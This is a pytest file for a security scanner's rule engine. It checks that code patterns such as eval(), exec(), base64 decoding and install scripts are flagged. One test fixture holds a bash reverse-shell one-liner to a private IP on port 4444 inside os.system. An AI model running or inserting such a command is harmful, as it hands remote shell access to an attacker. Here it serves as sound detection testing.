"""
Basic tests for the rule engine.
Run with:  python -m pytest tests/
"""

import pytest
from safedev.utils.rule_engine import load_rules, scan_content


@pytest.fixture
def rules():
    return load_rules()


def test_eval_detected(rules):
    code = "result = eval(user_input)"
    findings = scan_content(code, "test.py", rules)
    ids = [f["rule_id"] for f in findings]
    assert "SD-001" in ids, "eval() should be detected"


def test_exec_detected(rules):
    code = "exec(open('malicious.py').read())"
    findings = scan_content(code, "test.py", rules)
    ids = [f["rule_id"] for f in findings]
    assert "SD-002" in ids, "exec() should be detected"


def test_base64_detected(rules):
    code = "import base64; payload = base64.b64decode('aGVsbG8=')"
    findings = scan_content(code, "test.py", rules)
    ids = [f["rule_id"] for f in findings]
    assert "SD-003" in ids, "base64.b64decode should be detected"


def test_clean_code_passes(rules):
    code = "def hello():\n    print('hello world')"
    findings = scan_content(code, "test.py", rules)
    assert findings == [], "Clean code should produce no findings"


def test_reverse_shell_detected(rules):
    code = "os.system('bash -i >& /dev/tcp/10.0.0.1/4444 0>&1')"
    findings = scan_content(code, "test.py", rules)
    ids = [f["rule_id"] for f in findings]
    assert "SD-009" in ids, "Reverse shell should be detected"


def test_install_script_flagged(rules):
    findings = scan_content("echo hello", "install.sh", rules)
    ids = [f["rule_id"] for f in findings]
    assert "SD-007" in ids, "install.sh filename should be flagged"


def test_file_type_filtering(rules):
    # SD-002 (exec) only applies to .py files, not .md
    code = "exec(something)"
    findings = scan_content(code, "README.md", rules)
    ids = [f["rule_id"] for f in findings]
    assert "SD-002" not in ids, "exec() rule should not fire on .md files"
